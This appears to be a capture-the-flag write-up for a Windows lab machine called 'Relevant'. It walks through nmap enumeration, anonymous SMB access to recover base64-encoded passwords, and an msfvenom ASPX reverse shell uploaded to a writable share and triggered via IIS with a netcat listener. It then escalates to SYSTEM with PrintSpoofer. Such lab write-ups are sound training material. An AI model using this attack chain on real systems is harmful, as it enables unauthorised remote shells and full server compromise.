# Machine Name: Relevant
# Machine IP: 10.112.159.48
# Medium Windows

----
First of all, lets look at the open ports:   
```bash
┌──(faridd㉿Ferid)-[~/Downloads/relevant]
└─$ nmap -Pn 10.112.159.48 -sV -sC -p-
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-19 14:00 +0400
Nmap scan report for 10.112.159.48
Host is up (0.066s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2026-04-18T09:55:43
|_Not valid after:  2026-10-18T09:55:43
|_ssl-date: 2026-04-19T10:03:41+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2026-04-19T10:03:00+00:00
49663/tcp open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: RELEVANT; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-04-19T03:03:05-07:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-04-19T10:03:01
|_  start_date: 2026-04-19T09:55:40
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h23m59s, deviation: 3h07m52s, median: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 202.53 seconds
```
There are two lines which immediately attracted me. It simply says that we have read permission over smb shares and it is 90% we can also write in there.   
* **message_signing: disabled (dangerous, but default)**   
* **account_used: guest**   
Let's try to access it:   
```bash
smbclient -L //10.112.159.48/ -N
```
And yeah I saw an **"nt4wrksv"** shared folder that we can access without needing a password. When I move on this folder, I saw a **password.txt** file in there:    
```bash
smbclient //10.112.159.48/nt4wrksv -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jul 26 01:46:04 2020
  ..                                  D        0  Sun Jul 26 01:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 19:15:33 2020

		7735807 blocks of size 4096. 4906037 blocks available
smb: \> get passwords.txt 
getting file \passwords.txt of size 98 as passwords.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> !cat passwords.txt 
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQksmb: \> exit
```
```bash
┌──(faridd㉿Ferid)-[~/Downloads/relevant]
└─$ echo 'Qm9iIC0gIVBAJCRXMHJEITEyMw==' | base64 -d              
Bob - !P@$$W0rD!123
┌──(faridd㉿Ferid)-[~/Downloads/relevant]
└─$ echo 'QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk' | base64 -d
Bill - Juw4nnaM4n420696969!$$$
```
It gave us two username and password. We cannot use them anyway because **ssh port(22)** is not enable in this machine. I decided to check them for accessing the **ADMIN** and **C** shared folders:    
```bash
┌──(faridd㉿Ferid)-[~/Downloads/relevant]
└─$ smbclient //10.112.159.48/C$ -U Bob%'!P@$$W0rD!123'
tree connect failed: NT_STATUS_ACCESS_DENIED
                                                                                                                                                                                                                                                                                                                                                                                         
┌──(faridd㉿Ferid)-[~/Downloads/relevant]
└─$ smbclient //10.112.159.48/ADMIN$ -U Bob%'!P@$$W0rD!123'
tree connect failed: NT_STATUS_ACCESS_DENIED
                                                                                                                                                                                              
┌──(faridd㉿Ferid)-[~/Downloads/relevant]
└─$ smbclient //10.112.159.48/IPC$ -U Bob%'!P@$$W0rD!123'
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_NO_SUCH_FILE listing \*
smb: \> exit
┌──(faridd㉿Ferid)-[~/Downloads/relevant]
└─$ smbclient //10.112.159.48/C$ -U Bill%'Juw4nnaM4n420696969!$$$'
tree connect failed: NT_STATUS_ACCESS_DENIED
                                                                                                                                                                                              
┌──(faridd㉿Ferid)-[~/Downloads/relevant]
└─$ smbclient //10.112.159.48/ADMIN$ -U Bill%'Juw4nnaM4n420696969!$$$'
tree connect failed: NT_STATUS_ACCESS_DENIED
                                                                                                                                                                                              
┌──(faridd㉿Ferid)-[~/Downloads/relevant]
└─$ smbclient //10.112.159.48/IPC$ -U Bill%'Juw4nnaM4n420696969!$$$'
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_NO_SUCH_FILE listing \*
smb: \> 
```
As you can see, they were useless. But remember that we have write permission on the **nt4wrksv** folder. We can create our own script for reverse shell and upload it into there, then we will open this file on browser, activate the script and get the shell:     
```bash
┌──(faridd㉿Ferid)-[~/Downloads/relevant]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.137.68 LPORT=4444 -f aspx -o exploit.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3396 bytes
Saved as: exploit.aspx
```
Go to the smb terminal and upload this exploit to there.     
```bash
smb: \> put exploit.aspx 
putting file exploit.aspx as \exploit.aspx (15.6 kB/s) (average 15.6 kB/s)
smb: \> ls
  .                                   D        0  Sun Apr 19 14:22:46 2026
  ..                                  D        0  Sun Apr 19 14:22:46 2026
  exploit.aspx                        A     3396  Sun Apr 19 14:22:46 2026
  passwords.txt                       A       98  Sat Jul 25 19:15:33 2020

		7735807 blocks of size 4096. 5097470 blocks available
smb: \> 
```
As you can remember the nmap scan results, there was a **port (49663)** where the **Microsoft IIS (nt4wrksv)** is running. So, we will use this url to get the shell but do not forget to write **"rlwrap nc -nvlp 4444"** before opening this url.      
```bash
http://10.112.159.48:49663/nt4wrksv/exploit.aspx
```
Yeahhh, I got the shell.    
```bash
┌──(faridd㉿Ferid)-[~/Downloads/relevant]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.137.68] from (UNKNOWN) [10.112.159.48] 49976
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool

c:\windows\system32\inetsrv>
```
I decided to check my privileges at first.   
```bash
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

c:\windows\system32\inetsrv>
```
**"SeImpersonatePrivilege"** - It is one of the most popular CTF privilege. By the help of **"PrintSpoofer64.exe"** file, we can be root easily. Just download it from there: *https://github.com/itm4n/PrintSpoofer/releases*    
I downloaded its x64 version because when I checked **"systeminfo"** command, I saw **"System Type: x64-based PC"**. Otherwise, it wouldn't work properly. Yeah, After installing it, just upload to the nt4wrksv folder via smb.     
```bash
smb: \> put PrintSpoofer64.exe 
putting file PrintSpoofer64.exe as \PrintSpoofer64.exe (93.0 kB/s) (average 60.0 kB/s)
smb: \> ls
  .                                   D        0  Sun Apr 19 14:32:18 2026
  ..                                  D        0  Sun Apr 19 14:32:18 2026
  exploit.aspx                        A     3396  Sun Apr 19 14:22:46 2026
  passwords.txt                       A       98  Sat Jul 25 19:15:33 2020
  PrintSpoofer64.exe                  A    27136  Sun Apr 19 14:32:18 2026

		7735807 blocks of size 4096. 5097634 blocks available
smb: \> 
```

----
# Privilege escalation    
Go to the windows shell and move this folder **"c:\inetpub\wwwroot\nt4wrksv"**. You will see this exploit file in there.    
```bash
PrintSpoofer64.exe -i -c cmd
```
By executing this command, we became system administrator and then, can get the user and root flag easily:   
```bash
type c:\Users\Bob\Desktop\user.txt
type c:\Users\Administrator\Desktop\root.txt
```
